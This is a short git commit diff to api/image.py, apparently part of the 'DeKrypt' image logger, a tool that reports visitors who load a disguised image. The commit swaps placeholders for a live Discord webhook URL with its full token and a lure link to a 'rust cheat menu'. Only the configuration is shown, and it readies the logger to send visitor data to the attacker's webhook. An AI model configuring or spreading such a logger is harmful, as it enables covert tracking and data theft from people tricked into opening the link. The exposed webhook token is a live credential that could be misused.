cf9a3fd96cec92bd645546fe776845b8037c1cde
FTCONTOPZZ <bradleyishim5@gmail.com>
2025-01-30 21:48:07 -0800

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1324245093191913482/RYf4Dfa77diVFvAAlsw9BG8YfZg99byICvxrW7Gee3Ogo1t9yISrV9hPj8tLyNt06NaX",
+    "image": "https://www.figma.com/community/file/1092403911017939412/rust-cheat-menu", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
